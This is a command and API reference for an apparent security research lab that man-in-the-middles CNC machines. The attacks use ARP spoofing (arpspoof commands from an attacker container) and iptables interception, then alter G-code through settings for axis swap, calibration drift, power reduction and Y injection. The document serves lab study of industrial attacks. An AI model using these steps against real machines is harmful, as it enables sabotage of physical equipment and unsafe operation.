# Command & API Reference

Complete reference for commands, API endpoints, and troubleshooting.

## Quick Commands

### Dashboard Control

```bash
# Start (WSL2 Development)
cd /mnt/c/Users/YourUsername/Documents/Doom-and-Gloom
source .venv/bin/activate
cd analysis/frontend
python3 arp_loader.py

# Start (Docker)
docker-compose up -d

# Stop
pkill -f arp_loader.py  # WSL2
docker-compose down     # Docker

# Restart
pkill -f arp_loader.py && sleep 2 && python3 analysis/frontend/arp_loader.py

# View logs
docker-compose logs -f dashboard
tail -f logs/doom_dashboard.log
```

### Docker Infrastructure

```bash
# Start 3-node ARP environment
cd infrastructure/docker
docker-compose up -d

# Access containers
docker exec -it A-10.9.0.5 /bin/bash      # HostA
docker exec -it B-10.9.0.6 /bin/bash      # HostB  
docker exec -it M-10.9.0.105 /bin/bash    # HostM (attacker)

# Container logs
docker-compose logs -f
docker logs A-10.9.0.5

# Stop all
docker-compose down

# Rebuild
docker-compose build --no-cache
docker-compose up -d
```

### Testing

```bash
# Smoke tests
python3 tests/smoke_test.py

# API health check
curl http://localhost:5000/api/status

# Dash UI check
curl -I http://localhost:5000/dash/

# Docker health
docker ps
docker-compose ps
```

---

## API Reference

Base URL: `http://localhost:5000`

### System Status

**GET /api/status**

Returns system state, attack configuration, and statistics.

```bash
curl http://localhost:5000/api/status
```

Response:
```json
{
  "connected": false,
  "iptables_active": false,
  "network_config": {
    "cnc_ip": "192.168.0.170",
    "cnc_port": 8080,
    "proxy_port": 8888,
    "interface": "eth0"
  },
  "active_attacks": {
    "axis_swap": {"enabled": false},
    "calibration_drift": {"enabled": false, "drift_rate": 1.0},
    "power_reduction": {"enabled": false, "reduction_factor": 0.5}
  },
  "statistics": {
    "total_commands": 0,
    "modified_commands": 0,
    "verified_attacks": 0
  }
}
```

### Network Configuration

**GET /api/network/config**

Get current network configuration.

```bash
curl http://localhost:5000/api/network/config
```

**POST /api/network/config**

Update network configuration.

```bash
curl -X POST http://localhost:5000/api/network/config \
  -H "Content-Type: application/json" \
  -d '{
    "cnc_ip": "192.168.0.170",
    "cnc_port": 8080,
    "proxy_port": 8888,
    "interface": "eth0"
  }'
```

### IPTables Control

**POST /api/iptables/setup**

Enable traffic interception.

```bash
curl -X POST http://localhost:5000/api/iptables/setup \
  -H "Content-Type: application/json" \
  -d '{
    "interface": "eth0",
    "cnc_ip": "192.168.0.170",
    "proxy_port": 8888
  }'
```

**GET /api/iptables/status**

Check IPTables status.

```bash
curl http://localhost:5000/api/iptables/status
```

Response:
```json
{
  "active": false,
  "rules": [],
  "interface": "eth0"
}
```

**POST /api/iptables/disable**

Disable traffic interception.

```bash
curl -X POST http://localhost:5000/api/iptables/disable
```

### CNC Connection

**POST /api/connect**

Connect to CNC machine.

```bash
curl -X POST http://localhost:5000/api/connect \
  -H "Content-Type: application/json" \
  -d '{
    "host": "192.168.0.170",
    "port": 8080
  }'
```

**POST /api/send_command**

Send G-code command to CNC.

```bash
curl -X POST http://localhost:5000/api/send_command \
  -H "Content-Type: application/json" \
  -d '{
    "command": "G0 X10 Y10"
  }'
```

### Attack Configuration

**POST /api/attack_config**

Configure attack parameters.

```bash
curl -X POST http://localhost:5000/api/attack_config \
  -H "Content-Type: application/json" \
  -d '{
    "axis_swap": {"enabled": true},
    "calibration_drift": {
      "enabled": true,
      "drift_rate": 1.0,
      "max_drift": 20.0
    },
    "power_reduction": {
      "enabled": false,
      "reduction_factor": 0.5
    },
    "y_injection": {
      "enabled": false,
      "injection_amount": -2.0
    }
  }'
```

---

## ARP Attack Commands

### Manual ARP Poisoning

```bash
# From HostM container
docker exec -it M-10.9.0.105 /bin/bash

# Start ARP spoofing
arpspoof -i eth0 -t 10.9.0.5 10.9.0.6 &
arpspoof -i eth0 -t 10.9.0.6 10.9.0.5 &

# Verify ARP cache poisoning
arp -n  # Check ARP table

# Stop ARP spoofing
pkill arpspoof
```

### Orchestrated Attack

```bash
cd /volumes
python3 arp_attack_orchestrator.py \
  --target-a 10.9.0.5 \
  --target-b 10.9.0.6 \
  --duration 120

# With packet capture disabled
python3 arp_attack_orchestrator.py \
  --target-a 10.9.0.5 \
  --target-b 10.9.0.6 \
  --no-capture
```

---

## Environment Variables

```bash
# Flask configuration
export FLASK_ENV=production
export FLASK_DEBUG=0
export FLASK_APP=analysis/dashboard_enhanced.py

# Network configuration
export CNC_IP=192.168.0.170
export CNC_PORT=8080
export PROXY_PORT=8888
export INTERFACE=eth0

# Logging
export LOG_LEVEL=INFO
export LOG_FILE=logs/doom_dashboard.log
```

---

## File Locations

### Configuration
- `project_config.yaml` - Main configuration
- `analysis/dashboard_enhanced.py` - Server config (lines 40-50)
- `docker-compose.yml` - Docker config
- `infrastructure/docker/docker-compose.yml` - ARP infrastructure

### Logs
- `logs/doom_dashboard.log` - Application logs
- `logs/attack_log_*.json` - Attack execution logs
- `data/archived_experiments/` - Historical data

### Code
- `analysis/dashboard_enhanced.py` - Flask server + IPTables
- `analysis/frontend/arp_loader.py` - Dash UI loader
- `scenarios/attack_modules/` - Attack implementations
- `tests/smoke_test.py` - Test suite

---

## Troubleshooting

### Common Errors & Solutions

#### 1. Port 5000 Already in Use

**Error:**
```
OSError: [Errno 98] Address already in use
```

**Solution:**
```bash
# Find process
lsof -i :5000        # Linux/Mac
netstat -ano | findstr :5000  # Windows

# Kill process
pkill -f arp_loader.py
pkill -f dashboard_enhanced.py

# Or use specific PID
kill -9 <PID>
```

#### 2. Template Not Found

**Error:**
```
jinja2.exceptions.TemplateNotFound: dashboard_enhanced.html
```

**Solution:**
Already fixed in latest code. If you still see this:
```bash
# Verify template_folder setting
grep -A5 "Flask(__name__" analysis/dashboard_enhanced.py

# Should see:
# template_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')
# app = Flask(__name__, template_folder=template_dir)
```

#### 3. Module Not Found

**Error:**
```
ModuleNotFoundError: No module named 'flask_socketio'
```

**Solution:**
```bash
source .venv/bin/activate
pip install -r requirements.txt

# Verify
pip list | grep flask-socketio
```

#### 4. Docker Permission Denied

**Error:**
```
permission denied while trying to connect to the Docker daemon socket
```

**Solution:**
```bash
# Linux
sudo usermod -aG docker $USER
newgrp docker

# Test
docker run hello-world
```

#### 5. IPTables Operation Not Permitted

**Error:**
```
iptables: Operation not permitted
```

**Solution:**

**Docker:** Verify NET_ADMIN capability in docker-compose.yml:
```yaml
cap_add:
  - NET_ADMIN
  - NET_RAW
```

**WSL2:** Run with sudo:
```bash
sudo python3 analysis/frontend/arp_loader.py
```

#### 6. Dash UI Returns 404

**Error:**
```
Not Found: /
```

**Solution:**
Check correct URL: `http://localhost:5000/dash/` (note the `/dash/` path)

Flask dashboard is at `http://localhost:5000/`

#### 7. Container Fails to Start

**Error:**
```
Error response from daemon: container ... failed to start
```

**Solution:**
```bash
# Check logs
docker logs <container_name>
docker-compose logs

# Rebuild
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

#### 8. Network Unreachable

**Error:**
```
Network is unreachable
```

**Solution:**
```bash
# Check Docker network
docker network ls
docker network inspect doom-and-gloom_default

# Recreate network
docker-compose down
docker network prune
docker-compose up -d
```

---

## Performance Tuning

### Optimize Docker

```yaml
# docker-compose.yml
services:
  dashboard:
    deploy:
      resources:
        limits:
          cpus: '2.0'
          memory: 4G
        reservations:
          cpus: '1.0'
          memory: 2G
```

### Increase Log Rotation

```python
# analysis/dashboard_enhanced.py
handler = RotatingFileHandler(
    'doom_dashboard.log',
    maxBytes=10_000_000,  # 10MB
    backupCount=5
)
```

### Database Optimization (if applicable)

```python
# Use connection pooling
# Implement caching for frequent queries
# Index common lookup fields
```

---

## Security Best Practices

1. **Network Isolation**
   - Use dedicated test network
   - No production systems
   - Firewall rules for ingress/egress

2. **Access Control**
   - Strong passwords for API (if implemented)
   - SSH keys for container access
   - Limit exposed ports

3. **Logging**
   - Enable comprehensive logging
   - Regular log rotation
   - Secure log storage

4. **Updates**
   - Keep Docker images updated
   - Regular Python dependency updates: `pip list --outdated`
   - Security patches: `apt update && apt upgrade`

---

## Useful Aliases

Add to `~/.bashrc` or `~/.zshrc`:

```bash
# Doom-and-Gloom shortcuts
alias doom='cd /mnt/c/Users/YourUsername/Documents/Doom-and-Gloom'
alias doom-start='doom && source .venv/bin/activate && cd analysis/frontend && python3 arp_loader.py'
alias doom-stop='pkill -f arp_loader.py'
alias doom-test='doom && source .venv/bin/activate && python3 tests/smoke_test.py'
alias doom-docker='doom && docker-compose up -d'
alias doom-logs='doom && docker-compose logs -f'
```

Reload: `source ~/.bashrc`

---

## Advanced Usage

### Custom Attack Module

```python
# scenarios/attack_modules/my_attack.py
def my_custom_attack(gcode):
    """Custom attack logic"""
    if 'G0' in gcode:
        # Modify rapid positioning
        return gcode.replace('G0', 'G1 F500')
    return gcode
```

### Extend API

```python
# analysis/dashboard_enhanced.py
@app.route('/api/custom_endpoint', methods=['POST'])
def custom_endpoint():
    data = request.json
    # Custom logic
    return jsonify({'result': 'success'})
```

### Monitor Network Traffic

```bash
# Inside Docker container
tcpdump -i eth0 -w /volumes/capture.pcap port 8080

# Analyze with Wireshark (on host)
wireshark /path/to/volumes/capture.pcap
```

---

## Support

- **Documentation**: [README.md](README.md), [SETUP.md](SETUP.md)
- **Issues**: GitHub Issues
- **Logs**: Check `logs/doom_dashboard.log`
- **Tests**: Run `python3 tests/smoke_test.py`
